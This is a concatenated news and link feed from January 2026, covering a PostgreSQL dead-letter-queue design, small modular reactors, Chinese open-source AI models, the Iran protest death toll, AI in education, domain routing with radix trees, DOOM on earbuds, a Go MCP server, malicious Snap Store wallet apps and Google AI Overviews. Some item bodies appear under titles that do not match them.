        + "FOR UPDATE SKIP LOCKED",
    nativeQuery = true
)
                        The  clause is crucial here. It allows each instance to lock and process different rows concurrently, preventing duplicate processing while maintaining high throughput. The query hint sets the lock timeout to , which means "wait indefinitely" but combined with , it effectively means "skip any rows that are already locked by another transaction."
                    
                        This setup allowed the system to tolerate long downstream outages while avoiding retry storms and unnecessary load on dependent services.
                    
                        With this approach, failures became predictable and observable rather than disruptive. Engineers could inspect failures using plain SQL, identify patterns, and reprocess only the events that mattered. If a downstream dependency was unavailable for hours or even days, events safely accumulated in the DLQ and were retried later without human intervention. If an event was fundamentally bad, it stayed visible instead of being silently dropped.
                    
                        Most importantly, this design reduced operational stress. Failures were no longer something to fear; they were an expected part of the system with a clear, auditable recovery path.
                    
                        The goal was never to replace Kafka with PostgreSQL. Kafka remained the backbone for high-throughput event ingestion, while PostgreSQL handled what it does best—durability, querying, and observability around failures. By letting each system play to its strengths, we ended up with a pipeline that was resilient, debuggable, and easy to operate.
                    
                        In the end, using PostgreSQL as a Dead Letter Queue turned failure handling into something boring and predictable. And in production systems, boring is exactly what you want.

Amazon has invested in X-Energy, and earlier this month, Meta announced a deal with Oklo, and in Michigan last month, Holtec began the long formal licensing process for two SMRs with America's Nuclear Regulatory Commission next to a nuclear plant it hopes to reactive. (And in 2024, California-based Kairos Power broke ground in Tennessee on a SMR "demo" reactor.) 

But "The reality, as ever, is likely to be messier and experts are sounding notes of caution..."

All the arguments in favor of SMRs overlook a fundamental issue, said Edwin Lyman, director of nuclear power safety at the Union of Concerned Scientists: They are too expensive. Despite all the money swilling around the sector, "it's still not enough," he told CNN. Nuclear power cannot compete on cost with alternatives, both fossil fuels and increasingly renewable energy, he said." 

Some SMRs also have an issue with fuel. The more unconventional designs, those cooled by salt or gas, often require a special type of fuel called high-assay low-enriched uranium, known as HALEU (pronounced hay-loo). The amounts available are limited and the supply chain has been dominated by Russia, despite efforts to build up a domestic supply. It's a major risk, said Nick Touran [a nuclear engineer and independent consultant]. The biggest challenge nuclear has is competing with natural gas, he said, a "luxury, super expensive fuel may not be the best way." There is still stigma around nuclear waste, too. SMR companies say smaller reactors mean less nuclear waste, but 2022 research from Stanford University suggested some SMRs could actually generate more waste, in part because they are less fuel efficient... 

As companies race to prove SMRs can meet the hype, experts appear to be divided in their thinking. For some, SMRs are an expensive — and potentially dangerous — distraction, with timelines that stretch so far into the future they cannot be a genuine answer to soaring needs for clean power right now. 

Nuclear engineering/consultant Touran told CNN the small reactors are "a technological solution to a financial problem. No venture capitalists can say, like, 'oh, sure, we'll build a $30 billion plant.' But, if you're down into hundreds of millions, maybe they can do it."]]></content:encoded></item><item><title>US climber Alex Honnold completes rope-free climb up Taipei 101 skyscraper | DW News</title><link>https://www.youtube.com/watch?v=jaI_Z2uOs0A</link><author>DW News</author><category>news</category><enclosure url="https://www.youtube.com/v/jaI_Z2uOs0A?version=3" length="" type=""/><pubDate>Sun, 25 Jan 2026 15:27:22 +0000</pubDate><source url="https://www.youtube.com/channel/UCknLrEdhRCp1aegoMqRaCZg">News - DW</source><content:encoded><![CDATA[An American climber has scaled one of Asia's tallest buildings, Taipei 101.

Crocs repurposed as flower pots. Cheeseburger-shaped eyeshadow. A gingerbread house made of vegetables.But what would-be buyers may not know is the tech behind this isn't necessarily US-made. Pinterest is experimenting with Chinese AI models to hone its recommendation engine."We've effectively made Pinterest an AI-powered shopping assistant," the firm's boss Bill Ready told me.Of course, the San Francisco-based tastemaker could use any number of American AI labs to power things behind-the-scenes.But since the launch of China's DeepSeek R-1 model in January 2025, Chinese AI tech has increasingly been a part of Pinterest.Ready calls the so-called "DeepSeek moment" a breakthrough."They chose to open source it, and that sparked a wave of open source models," he said.Chinese competitors include Alibaba's Qwen and Moonshot's Kimi, while TikTok owner ByteDance is also working on similar technology.Pinterest Chief Technology Officer Matt Madrigal said the strength of these models is that they can be freely downloaded and customised by companies like his - which is not the case with the majority of models offered by US rivals like OpenAI, which makes ChatGPT."Open source techniques that we use to train our own in-house models are 30% more accurate than the leading off-the-shelf models," Madrigal said.And those improved recommendations come at a much lower cost, he said, sometimes ninety percent less than using the proprietary models favoured by US AI developers.Pinterest is hardly the only US enterprise depending on AI tech from China.These models are gaining traction across an array of Fortune 500 companies.Airbnb boss Brian Chesky told Bloomberg in October his company relied "a lot" on Alibaba's Qwen to power its AI customer service agent.He gave three simple reasons - it's "very good", "fast" and "cheap".Further evidence can be found on Hugging Face, the place people go to download ready-made AI models - including from major developers Meta and Alibaba.Jeff Boudier, who builds products at the platform, said it is the cost factor that leads young start-ups to look at Chinese models over their US counterparts."If you look at the top trending models on Hugging Face - the ones that are most downloaded and liked by the community - typically, Chinese models from Chinese labs occupy many of the top 10 spots," he told me."There are weeks where four out of five top training models on Hugging Face are from Chinese labs."In September, Qwen topped Meta's Llama to become the most downloaded family of large language models on the Hugging Face platform.Meta released its open-source Llama AI models in 2023. Up until the release of DeepSeek and Alibaba's models, they were considered the go-to choice for developers working on bespoke applications.But the release of Llama 4 last year left developers underwhelmed, and Meta has reportedly been using open-source models with Alibaba, Google, and OpenAI to train a new model set for release this spring.Airbnb also uses several models, including US-based ones, hosting them securely in the company’s own infrastructure. The data is never provided to the developers of the AI models they use, according to the company.Going into 2025, the consensus was despite billions of dollars being spent by US tech firms, Chinese companies were threatening to pull ahead."That's not the story anymore," Boudier said. "Now, the best model is an open-source model."A report published last month by Stanford University found Chinese AI models "seem to have caught up or even pulled ahead" of their global counterparts - both in terms of what they're capable of, and how many people are using them.In a recent interview with the BBC, former UK deputy prime minister Sir Nick Clegg said he felt US firms were overly focused on the pursuit of AI which may one day surpass human intelligence.Last year, Sir Nick left his post as head of global affairs at Meta, the developer of Llama. Boss Mark Zuckerberg has committed billions of dollars to achieving what he calls "superintelligence."Some experts are now calling these ambitions vague and ill-defined – giving China an opening to dominate the open-source AI space."Here's the irony," Sir Nick said.In the battle between "the world's great autocracy" and "the world's greatest democracy" - China and America - China is "doing more to democratise the technology they're competing over".The Stanford report also suggested China's success in developing open-source models could be partly explained by government support.On the other side of the world, US companies like OpenAI are under intense pressure to increase revenue and become profitable - and is now turning to ads to help get there.The company released two open-source models last summer – its first in years. But it has poured most of its resources into proprietary models to help it make money.OpenAI boss Sam Altman told me in October it has invested aggressively into securing ever more computing power and infrastructure deals with partners."Revenue will grow super fast, but you should expect us to invest a ton in training, in the next model and the next and the next and the next," he said.]]></content:encoded></item><item><title>How global warming is changing where the world gets its chocolate #shorts #chocolate #guatemala</title><link>https://www.youtube.com/shorts/uX3J-40fg_8</link><author>Bloomberg Television</author><category>news</category><enclosure url="https://www.youtube.com/v/uX3J-40fg_8?version=3" length="" type=""/><pubDate>Sun, 25 Jan 2026 15:01:26 +0000</pubDate><source url="https://www.youtube.com/channel/UCIALMKvObZNtJ6AmdCLP7Lg">News - Bloomberg</source><content:encoded><![CDATA[Climate change is disrupting cocoa in West Africa and turning Ecuador into a major global supplier.

So many people were slaughtered by Iranian security services on that Thursday and Friday, it overwhelmed the state’s capacity to dispose of the dead. Stocks of body bags were exhausted, the officials said, and eighteen-wheel semi-trailers replaced ambulances.The government’s internal count of the dead, not previously revealed, far surpasses the toll of 3,117 announced on Jan. 21 by regime hardliners who report directly to Iran’s Supreme Leader Ali Khamenei. (Ministries report to the elected President.) The 30,000 figure is also far beyond tallies being compiled by activists methodically assigning names to the dead. As of Saturday, the U.S.-based Human Rights Activists News Agency said it had confirmed 5,459 deaths and is investigating 17,031 more.TIME has been unable to independently verify these figures.The Health Ministry’s two-day figure roughly aligns with a count gathered by physicians and first responders, and also shared with TIME. That surreptitious tally of deaths recorded by hospitals stood at 30,304 as of Friday, according to Dr. Amir Parasta, a German-Iranian eye surgeon who prepared a report of the data. Parasta said that number does not reflect protest-related deaths of people registered at military hospitals, whose bodies were taken directly to morgues, or that happened in locales the inquiry did not reach. Iran’s National Security Council has said protests took place in around 4,000 locations across the country.  “We are getting closer to reality,” Dr. Parasta said. “But I guess the real figures are still way higher.”That appears to be the reality implicit in the government’s internal figure of more than 30,000 deaths in two days. A slaughter on that scale, in the space of 48 hours, had experts on mass killing groping for comparisons.“Most spasms of killing are not from shootings,” said Les Roberts, a professor at Columbia University who specializes in the epidemiology of violent death. “In Aleppo [Syria] and in Fallujah [Iraq], when spasms of death this high have occurred over a few days, it involved mostly explosives with some shooting.”The only parallel offered by online databases occurred in the Holocaust. On the outskirts of Kyiv on Sept. 29 and 30, 1941, Nazi death squads executed 33,000 Ukrainian Jews by gunshot in a ravine known as Babyn Yar.In Iran, the killing fields extended across the country where, since Dec. 28, hundreds of thousands of citizens had assembled in the streets chanting first, for relief from an economy in freefall, and soon for the downfall of the Islamic regime. During the first week, security forces confronted some demonstrations, using mostly non-lethal force, but with officials also offering conciliatory language, the regime response was uncertain. That changed during the weekend commencing Jan. 8. Protests peaked, as opposition groups, includingReza Pahlavi, the exiled son of Iran’s former shah, urged people to join the throngs, and U.S. President Donald Trump repeated vows to protect them, though no help arrived.Witnesses say millions were in the streets when authorities shut down the internet and all other communications with the outside world. Rooftop snipers and trucks mounted with heavy machine guns opened fire, according to eyewitnesses and cell phone footage. On Friday, Jan. 9, an official of the Islamic Revolutionary Guard Corps warned on state television to anyone venturing into the streets, “if … a bullet hits you, don’t complain.”It took days for the reality to penetrate the internet blackout. Images of the bloodied bodies trickled out via illicit Starlink satellite internet connections. The task of counting the dead was hampered, however, because the authorities had also cut off lines of communications inside Iran. The first firm information came from a Tehran doctor who told TIME that just six hospitals in the capital had recorded at least 217 protester deaths after Thursday’s assault. Health care workers in Iran estimated at least 16,500 protesters had been killed by Jan. 10, according to an earlier report by Dr. Parasta in Munich. Friday’s update built on that research, he said.“I am genuinely impressed by how quickly this work was pulled together under extremely constrained and risky conditions,” said Paul B. Spiegel, a professor at the Johns Hopkins University International School of Health. Like Roberts, he expressed wariness of extrapolating from the figures provided by hospitals. Roberts, who traveled into war zones to research civilian death rates in Iraq and the Democratic Republic of Congo, said, “the 30,000 verified deaths are almost certainly an underestimate.”The emergence of the Ministry of Health numbers appears to confirm that—while underscoring the stakes for both Iranians and a regime that, in 1979, came to power when a sitting government was confronted by millions of people demanding its downfall.On Friday, Jan. 9, Sahba Rashtian, an aspiring animation artist, joined friends on the streets in Isfahan, a city in central Iran famous for its beauty. "Before anyone started chanting," a friend told TIME, "Sahba was seen collapsed on the ground. Her sister noticed blood on her hand.”Sahba died on an operating table at a nearby hospital. She was 23.“She always joked about her beautiful name,” her friend said. “She’d laugh and say, ‘Sahba means wine, and I am forbidden in the Islamic Republic.’”At the burial, the friend said, religious rites were barred, and Rashtian’s father wore white. “Congratulations,” he told mourners, according to the friend. “My daughter became a martyr on the path to freedom.”]]></content:encoded></item><item><title>(AudioWave) a lightweight Winamp-style audio player</title><link>https://www.reddit.com/r/linux/comments/1qmjhrm/audiowave_a_lightweight_winampstyle_audio_player/</link><author>/u/Kalen1987</author><category>reddit</category><pubDate>Sun, 25 Jan 2026 13:45:21 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>This Code Review Hack Actually Works When Dealing With Difficult Customers • @souldzin​</title><link>https://www.youtube.com/shorts/FA5l8Wxypvw</link><author>GOTO Conferences</author><category>yt</category><enclosure url="https://www.youtube.com/v/FA5l8Wxypvw?version=3" length="" type=""/><pubDate>Sun, 25 Jan 2026 13:00:23 +0000</pubDate><source url="https://www.youtube.com/channel/UCs_tLP3AiwYKwdUHpltJPuA">GOTO Conferences</source><content:encoded><![CDATA[Check out the full version on our YouTube channel now! #GOTOcon #PaulSlaughter #ConventionalComments #TeamDynamics #CodeQuality #PairProgramming #TeamHappiness #SoftwareEngineering #Programming #TodayInTech #ViralProgrammingShorts #Viral #ViralShorts #TodayInTech #GOTO

The study (by the Brookings Institution's Center for Universal Education) also suggests how to prevent risks and maximize benefits:


After interviews, focus groups, and consultations with over 500 students, teachers, parents, education leaders, and technologists across 50 countries, a close review of over 400 studies, and a Delphi panel, we find that at this point in its trajectory, the risks of utilizing generative AI in children's education overshadow its benefits.
 

"At the top of Brookings' list of risks is the negative effect AI can have on children's cognitive growth," reports NPR — "how they learn new skills and perceive and solve problems."

The report describes a kind of doom loop of AI dependence, where students increasingly off-load their own thinking onto the technology, leading to the kind of cognitive decline or atrophy more commonly associated with aging brains... As one student told the researchers, "It's easy. You don't need to (use) your brain." The report offers a surfeit of evidence to suggest that students who use generative AI are already seeing declines in content knowledge, critical thinking and even creativity. And this could have enormous consequences if these young people grow into adults without learning to think critically... 
Survey responses revealed deep concern that use of AI, particularly chatbots, "is undermining students' emotional well-being, including their ability to form relationships, recover from setbacks, and maintain mental health," the report says. One of the many problems with kids' overuse of AI is that the technology is inherently sycophantic — it has been designed to reinforce users' beliefs... Winthrop offers an example of a child interacting with a chatbot, "complaining about your parents and saying, 'They want me to wash the dishes — this is so annoying. I hate my parents.' The chatbot will likely say, 'You're right. You're misunderstood. I'm so sorry. I understand you.' Versus a friend who would say, 'Dude, I wash the dishes all the time in my house. I don't know what you're complaining about. That's normal.' That right there is the problem." 

AI did have some advantages, the article points out:
The report says another benefit of AI is that it allows teachers to automate some tasks: "generating parent emails ... translating materials, creating worksheets, rubrics, quizzes, and lesson plans" — and more. The report cites multiple research studies that found important time-saving benefits for teachers, including one U.S. study that found that teachers who use AI save an average of nearly six hours a week and about six weeks over the course of a full school year... 

AI can also help make classrooms more accessible for students with a wide range of learning disabilities, including dyslexia. But "AI can massively increase existing divides" too, [warns Rebecca Winthrop, one of the report's authors and a senior fellow at Brookings]. That's because the free AI tools that are most accessible to students and schools can also be the least reliable and least factually accurate... "[T]his is the first time in ed-tech history that schools will have to pay more for more accurate information. And that really hurts schools without a lot of resources." 

The report calls for more research — and make several recommendations (including "holistic" learning and "AI tools that teach, not tell.") But this may be their most important recommendation. "Provide a clear vision for ethical AI use that centers human agency..." 

"We find that AI has the potential to benefit or hinder students, depending on how it is used."]]></content:encoded></item><item><title>I got tired of manual priority weights in proxies so I used a Reverse Radix Tree instead</title><link>https://getlode.app/blog/2026-01-25-stop-playing-priority-tetris</link><author>/u/robbiedobbie</author><category>reddit</category><pubDate>Sun, 25 Jan 2026 12:30:56 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[Configuring a reverse proxy or a local development tool often feels like a chore. You start with one or two simple rules. Then you add a wildcard. Soon you have a list of fifty rules and a massive headache.The main issue is ambiguity. If you have a rule for  and another for , which one should the system choose? Many routing implementations solve this with manual weights. You spend your afternoon assigning priority numbers like 10, 50, or 100. If you get the order wrong, your API traffic ends up in the wrong service.I wanted a system where the most specific match is chosen automatically. By combining a specific data structure with a literal scoring algorithm, you can make domain routing feel intuitive.The Problem with Left-to-Right ThinkingTo solve domain routing, you first have to realize that domains are written backwards. We read them from left to right. However, the actual hierarchy of a domain works from right to left.In the domain , the  part is the most general. The  part is the most specific tip of the leaf. If you try to process this as a standard string, you are fighting the natural shape of the data.The solution is to split the domain by the dots and reverse the segments. Instead of a single string, you get a clear path: ["test", "myapp", "staging", "api"].When you store these in a , every domain ending in  shares the same root. As the resolver walks down the branches, it naturally narrows its search. It moves from the general Top-Level Domain (TLD) down to the specific subdomain. This structure is the foundation for everything else.Literal Density: The Scoring SecretHow do we decide which pattern is “better” without asking the user for a priority number? We use a concept called .Every segment in a domain can be a static string, a wildcard, or a pattern. We calculate a specificity score based on how many literal characters are in that segment. A literal character is any fixed part of the string that is not a wildcard or a parameter placeholder.The resolver follows a simple rule at every level of the tree. It tries an exact match first. If no exact match exists, it looks at the available patterns. It then picks the pattern with the highest literal score. This is deterministic. There are no magic numbers or best guesses. A more “complex” pattern is objectively more specific.The Five-Service HierarchyTo see how this works in practice, consider five services that would typically cause a routing conflict. In a tree-based system, they live together without overlapping. →  (Exact match) →  (A wildcard subdomain) →  (A wildcard middle segment) →  (Another wildcard middle segment) →  (The catch-all)In many proxies, you would have to carefully order these rules in a configuration file. In a reverse radix tree, the hierarchy acts as a natural filter.Scenario A: The Specific SubdomainImagine a request for .
The resolver starts at . It finds an exact match for . It moves into that branch. Once inside the  branch, it looks for the next segment: . It does not find an exact match. It falls back to the wildcard  that belongs specifically to the  node.
 It hits .Scenario B: The Nested MatchImagine a request for .
The resolver starts at . It looks for an exact match for . It finds nothing. It falls back to the root wildcard  directly under . Inside that wildcard branch, it looks for the next segment: . It finds an exact match.
 It hits .Scenario C: The Catch-allImagine a request for .
The resolver starts at . It looks for . It finds nothing. It falls back to the root wildcard . Since there are no more segments in the request, it checks if this node is a terminal.
 It hits .The wildcards only compete with each other if they share the same parent. Service 3 and Service 4 never even meet during the search.Dynamic Upstreams: Named ParametersMatching a domain is only half the battle. You often need the routing to be dynamic. This is where  come in.You can define a rule like . In the tree,  acts like a wildcard. However, it has a special job. When the resolver matches this segment, it captures the value.These parameters are not just metadata. They are used to hydrate your service configuration. For example, you might set an upstream fallback to http://{tenant}.internal:8080.If a user visits , the system identifies “apple” as the tenant. It then dynamically routes the request to http://apple.internal:8080. This allows you to create a single service rule that handles an infinite number of dynamic upstreams. You do not need to create a new rule for every single customer or project.There is a common misconception that all proxies are equally fast at scale. Many routing libraries or simple middleware implementations use a linear search. They iterate through a list of regex patterns one by one. If you have 1,000 rules, the system might perform 1,000 checks for every single request.The reverse radix tree is designed for speed, but the complexity depends on how you use it. For exact matches, the complexity is O(L), where L is the number of segments in the domain. You simply perform a hash map lookup at each step.However, when you introduce patterns, you enter the Pattern Room. At any given level, the resolver must scan through the list of patterns. If you have dozens of patterns at the same level, the complexity for that segment becomes O(P), where P is the number of patterns. Even in the worst case, this is much faster than a global search. The tree isolates the search to only the patterns that are relevant to that specific branch.Why We Gave Up “Depth-Blind” RegexMost tools stick to linear searches because they allow for complex regular expressions that span multiple domain levels. A single regex can match across an entire hostname regardless of how many dots it contains.By using a tree, we give up that “depth-blind” matching. You must specify your rules level by level. In practice, this is rarely a limitation. It actually mimics how real DNS rules work. In the real world, a wildcard only covers a single level in the domain hierarchy. By following this logic, we gain massive performance and predictability without losing the features you actually need.We often try to solve complexity by adding more configuration. We add weights, priorities, and flags. By changing our perspective and using a data structure that mirrors the problem, we can remove that configuration entirely.Reversing the domain and scoring the segments creates a set and forget experience. The system behaves exactly how a developer expects it to. You get to stop playing priority Tetris and get back to building your actual project.]]></content:encoded></item><item><title>Gaziantep Türkiye Food tour Day 5</title><link>https://www.youtube.com/shorts/54gyElbn-UU</link><author>Middle Eats</author><category>yt</category><enclosure url="https://www.youtube.com/v/54gyElbn-UU?version=3" length="" type=""/><pubDate>Sun, 25 Jan 2026 12:30:08 +0000</pubDate><source url="https://www.youtube.com/channel/UCWj_rUMGYCP0DjffybE2nbg">Middle Eats</source><content:encoded><![CDATA[Gaziantep Türkiye Food tour Day 5

            Serial Connection
            
              Earbuds don't have displays, so the only way to transfer data to/from them is either via bluetooth, or the UART contact pads.
              Bluetooth is pretty slow, you'd be lucky to get a consistent 1mbps connection, UART is easily the better option.
              DOOM's framebuffer is (width * height) bytes, 320 * 200 = 96kB. (doom's internal framebuffer is 8-bit not 24-bit)
              The UART connection provides us with 2.4mbps of usable bandwidth. 2,400,000 / 8 / 96,000 gives us... 3 frames per second.
              Clearly we need to compress the video stream. Modern video codecs like h264 consume way too much CPU and RAM.
              The only feasible approach is sending the video as an MJPEG stream. MJPEG is a stream of JPEG images shown one after the other.
              I found an excellent JPEG encoder for embedded devices here, thanks Larry!
              A conservative estimate for the average HIGH quality JPEG frame is around 13.5KB, but most scenes (without enemies) are around 11kb.
              - Optimistic:     `2,400,000 / (11,000 * 8)` = 27.3 FPS
              - Conservative: `2,400,000 / (13,500 * 8)` = 22.2 FPS
            
            CPU
            
              The stock open source firmware has the CPU set to 100mhz, so I cranked that up to 300mhz and disabled low power mode.
              The Cortex-M4F running at 300mhz is actually more than enough for DOOM, however it struggles with JPEG encoding.
              This is why it maxes out at ~18fps, I don't think there's much else I can do to speed it up.
            
            RAM
            
              By default, we only have access to 768KB of RAM, after disabling the co-processor it gets bumped up to the advertised 992KB.
              DOOM requires 4MB of RAM, though there are plenty of optimisations that can reduce this amount.
              Pre-generating lookup tables, making variables const, reading const variables from flash, disabling DOOM's caching system, removing unneeded variables. It all adds up!
            
            FLASH
            
              The shareware DOOM 1 wad (assets file) is 4.2MB and the earbuds can only store 4MB of data.
              Thankfully, fragglet, a well-known doom modder, has already solved this issue for me.Squashware is his trimmed-down DOOM 1 wad that is only 1.7MB in size.
              With this wad file, everything comfortably fits in flash.

I have been following some groups, papers and trends and it is still unclear what is the exact direction in which AI4PDEs and scientific ML is going into. Recent works show reinforcement learning for fluid dynamics, neural operators applied to irregular domains via transformers, GNNs or PointNet, nice works on diffusion or flow matching for inverse problems with physical constraints, and of course protein ans drug discovery tasks. Robotics folks also are using physics environments for policy learning, which based on my limited knowledge, also include some aspects of scientific machine learning. Of course due to ODEs/PDEs, the field also naturally extends to control theory and chaotic systems. Very recently some groups also published foundational models for PDEs. In robotics, major work on foundation VLA-type models is also going on. Some simulation software providers have also included ML or AI surrogates in their workflows. Agents that can automate complex simulation workflows, ML models that can learn from an existing DoE, and geometric deep learning is applied to iterate designs efficiently on irregular domains. : The research still seems scattered and I am unable to notice any trend. Is this true? Or am I missing a major trend that is picking up in research labs. For e.g. LLMs have had some noticeable trends: initially starting with prompt engineering, then reasoning and logical capabilities, now key focus on agentic systems and so on. Another question I have is: Is robot learning also aiming to include some aspects of scientific ML, possibly to reduce the sim-to-real gap? I'd like to know opinions and observations from folks interested in these areas.

After a while, I started instructing the assistants to look at specific files in my Go module cache. While this helped, it was hard to synchronize prompts and rules across all the AI assistants I used, whether that’s Cursor IDE, Claude, or others.To address this issue, I built a simple MCP server that keeps everything in one place. In this blog post, I’ll explain how to use it and compare the results with and without the MCP. AI assistants generate incorrect Go code because they rely on outdated training data.
    mcp-local-context

 - a free, local MCP server that teaches AI to read your  instead of guessing. Think of it as a free, local alternative to Context7. AI discovers correct SDK methods instead of reinventing them. Check out the 
    before/after comparison

 to see the difference.Installation: 
    README

 | 
    Manual prompts

 (if you don’t want to install, though you might miss new features like indexing)As I mentioned above, AI coding assistants often generate incorrect Go code when working with third-party packages. They rely on outdated documentation, incomplete examples, or assumptions based on their training data - which may be months or years old.You end up with code that:Uses wrong function signaturesMisses important types or methodsImplements workarounds for features that already exist in the SDKBreaks when you actually run itWhile existing third-party services provide context for packages, they add external dependencies and potential privacy concerns. The Go module cache is already on your machine - why not use it directly?I built an 
    MCP server

 that runs locally on your machine and provides AI tools with instructions on how to access your Go module cache. MCP (Model Context Protocol) is an open protocol that allows AI assistants to access external data sources.The server doesn’t parse Go files or search for documentation itself, at least in the current implementation as of the date of writing this post. Instead, it provides hints and instructions to the LLM on how to search for context in your local  directory. This guides the AI to look at the actual source code in your module cache rather than relying on outdated training data. Follow the guide in the 
    repository README

. If you prefer not to install the server, you can use the 
    manual prompts

 directly in your AI tool of choice.How this compares to Context7 and similar solutions takes a fundamentally different approach:Local-first, not cloud-based - reads directly from your  instead of using some remote service. - no subscriptions or API keys. Just install and use it.Exact dependency versions - works with the exact versions you have installed, not whatever the AI was trained on. - this tool doesn’t make any remote calls. Your code and dependencies stay on your machine. (Note: your AI assistant might still use external services, but this MCP server itself is purely local.)To demonstrate the difference, I tested the MCP server with 
    NATS.IO

, a popular messaging system with a comprehensive SDK. I chose NATS.IO as a representative example because its SDK is feature-rich, and AI models may not have complete knowledge of all its methods.I used the following prompt with Cursor’s  model (I used this model for consistency, as Claude Sonnet 4.5 appeared to have memorized context from previous attempts):Create a NATS.IO subscriber and publisher. The subscriber should send a basic event, such as the coordinates of a point, and the publisher should calculate the distance between the previous point and the current point. Use Cobra for commands.

Additionally, add a debug HTTP endpoint to see the number of currently pending messages.

Use local-context mcp.
Without MCP: Manual ImplementationWithout access to the module cache, the AI generated code that manually tracked pending messages using atomic counters:This works, but not correctly, ignoring the possible tail of pending messages for the exact subscription and so on. Moreover, it’s reinventing functionality that already exists in the SDK.With MCP: Using SDK MethodsWith MCP providing instructions on how to search the module cache, the AI correctly identified and used the SDK’s  method: The  method handles edge cases, thread safety, and provides accurate counts that manual tracking might miss. It’s also the idiomatic way to use the SDK.🤖  The generated code structures differ due to LLM non-determinism, but the key difference is clear: with MCP, the AI discovered and used the proper SDK method instead of implementing a manual workaround.⚠️  the generated code in both cases is far from perfect. For example, the LLM confused the publisher and the subscriber in the last example. However, the point of this blog post is simply to show a way to provide more context to the LLM. Of course, you still need to review the generated code. At the end of the day, you, not the LLM, are responsible for the software.Improving the context you provide to AI coding assistants isn’t just about getting correct code - it’s about leveraging the tools you already have. Your Go module cache contains the exact source code, examples, documentation, and API definitions for the dependencies you’re actually using. By giving AI tools access to this local context, you eliminate the guesswork that leads to wrong function signatures, outdated APIs, and manual workarounds.The MCP server approach demonstrates that you don’t need to rely on third-party services or hope that AI models have the right information in their training data. You can take control of the context directly, ensuring accuracy while maintaining privacy and reducing costs.The solution works well for me, and I hope it helps you too. Over time, it can be extended with features like dependency indexing to improve context retrieval, especially for large dependencies.

In a blog post, Alan Pope, a longtime Ubuntu community figure and former Canonical employee who remains an active Snap publisher... [warns of] a persistent campaign of malicious snaps impersonating cryptocurrency wallet applications. These fake apps typically mimic well-known projects such as Exodus, Ledger Live, or Trust Wallet, prompting users to enter wallet recovery phrases, which are then transmitted to attackers, resulting in drained funds. 
The perpetrators had originally used similar-looking characters from other alphabets to mimic other app listings, then began uploading "revisions" to other innocuous-seeming (approved) apps that would transform their original listing into that of a fake crypto wallet app. 

But now they're re-registering expired domains to take over existing Snap Store accounts, which Pope calls "a significant escalation..."

I worked for Canonical between 2011 and 2021 as an Engineering Manager, Community Manager, and Developer Advocate. I was a strong advocate for snap packages and the Snap Store. While I left the company nearly five years ago, I still maintain nearly 50 packages in the Snap Store, with thousands of users... Personally, I want the Snap Store to be successful, and for users to be confident that the packages they install are trustworthy and safe. 


Currently, that confidence isn't warranted, which is a problem for desktop Linux users who install snap packages. I report every bad snap I encounter, and I know other security professionals do the same — even though doing so results in no action for days sometimes... To be clear: none of this should be seen as an attack on the Snap Store, Canonical, or the engineers working on these problems. I'm raising awareness of an issue that exists, because I want it fixed... But pretending there isn't a problem helps nobody.]]></content:encoded></item><item><title>Deutsche Telekom is throttling the internet</title><link>https://netzbremse.de/en/</link><author>tietjens</author><category>hn</category><pubDate>Sun, 25 Jan 2026 08:22:17 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[die Telekom nimmt nicht am Peering mit dem Deutschen Forschungsnetz teil und deshalb ist die Verbindung für Telekom-Kunden zu deutschen Universitäten eine Katastrophe.

Google's search feature AI Overviews cites YouTube more than any medical website when answering queries about health conditions, according to research that raises fresh questions about a tool seen by 2 billion people each month. 

The company has said its AI summaries, which appear at the top of search results and use generative AI to answer questions from users, are "reliable" and cite reputable medical sources such as the Centers for Disease Control and Prevention and the Mayo Clinic. However, a study that analysed responses to more than 50,000 health queries, captured using Google searches from Berlin, found the top cited source was YouTube. The video-sharing platform is the world's second most visited website, after Google itself, and is owned by Google. Researchers at SE Ranking, a search engine optimisation platform, found YouTube made up 4.43% of all AI Overview citations. No hospital network, government health portal, medical association or academic institution came close to that number, they said. "This matters because YouTube is not a medical publisher," the researchers wrote. "It is a general-purpose video platform...." 

In one case that experts said was "dangerous" and "alarming", Google provided bogus information about crucial liver function tests that could have left people with serious liver disease wrongly thinking they were healthy. The company later removed AI Overviews for some but not all medical searches... Hannah van Kolfschooten, a researcher specialising in AI, health and law at the University of Basel who was not involved with the research, said: "This study provides empirical evidence that the risks posed by AI Overviews for health are structural, not anecdotal. It becomes difficult for Google to argue that misleading or harmful health outputs are rare cases. 

"Instead, the findings show that these risks are embedded in the way AI Overviews are designed. In particular, the heavy reliance on YouTube rather than on public health authorities or medical institutions suggests that visibility and popularity, rather than medical reliability, is the central driver for health knowledge."]]></content:encoded></item><item><title>I know it&apos;s not a big deal, but I just created my first script :D</title><link>https://www.reddit.com/r/linux/comments/1qm9w9e/i_know_its_not_a_big_deal_but_i_just_created_my/</link><author>/u/Main_Ear9949</author><category>reddit</category><pubDate>Sun, 25 Jan 2026 05:04:01 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Palantir has no place in UK public services</title><link>https://www.opendemocracy.net/en/zarah-sutlana-palantir-no-place-uk-public-services-ministry-of-defence/</link><author>jethronethro</author><category>hn</category><pubDate>Sun, 25 Jan 2026 04:53:29 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Stackmaxxing for a recursion world record</title><link>https://www.youtube.com/watch?v=WQKSyPYF0-Y</link><author>/u/Chii</author><category>reddit</category><pubDate>Sun, 25 Jan 2026 04:44:58 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Canada-China trade deal: Why is Trump threatened by it? | DW News</title><link>https://www.youtube.com/watch?v=PbxUYiN0e7U</link><author>DW News</author><category>news</category><enclosure url="https://www.youtube.com/v/PbxUYiN0e7U?version=3" length="" type=""/><pubDate>Sun, 25 Jan 2026 04:04:12 +0000</pubDate><source url="https://www.youtube.com/channel/UCknLrEdhRCp1aegoMqRaCZg">News - DW</source><content:encoded><![CDATA[US President Donald Trump has threatened 100% tariffs on Canadian goods, if Ottawa moves ahead with a trade deal with China.

